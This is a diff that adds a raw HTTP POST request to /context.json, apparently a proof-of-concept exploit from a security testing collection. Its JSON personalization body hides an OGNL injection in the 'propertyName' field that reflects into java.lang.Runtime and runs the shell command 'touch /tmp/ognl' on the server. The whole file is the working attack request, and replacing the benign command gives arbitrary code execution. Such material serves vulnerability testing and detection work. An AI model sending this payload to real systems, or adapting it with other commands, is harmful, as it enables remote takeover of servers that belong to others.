@@ -1,0 +1,38 @@
+POST /context.json HTTP/1.1
+Host: 10.10.3.128
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
+Connection: close
+Content-Type: application/json
+Content-Length: 1060
+
+{
+  "personalizations":[
+    {
+      "id":"gender-test",
+      "strategy":"matching-first",
+      "strategyOptions":{
+        "fallback":"var2"
+      },
+      "contents":[
+        {
+          "filters":[
+            {
+              "condition":{
+                "parameterValues":{
+                  "propertyName":"(#runtimeclass = #this.getClass().forName(\"java.lang.Runtime\")).(#getruntimemethod = #runtimeclass.getDeclaredMethods().{^ #this.name.equals(\"getRuntime\")}[0]).(#rtobj = #getruntimemethod.invoke(null,null)).(#execmethod = #runtimeclass.getDeclaredMethods().{? #this.name.equals(\"exec\")}.{? #this.getParameters()[0].getType().getName().equals(\"java.lang.String\")}.{? #this.getParameters().length < 2}[0]).(#execmethod.invoke(#rtobj,\"touch /tmp/ognl\"))",
+                  "comparisonOperator":"equals",
+                  "propertyValue":"male"
+                },
+                "type":"profilePropertyCondition"
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "sessionId":"sample"
+}
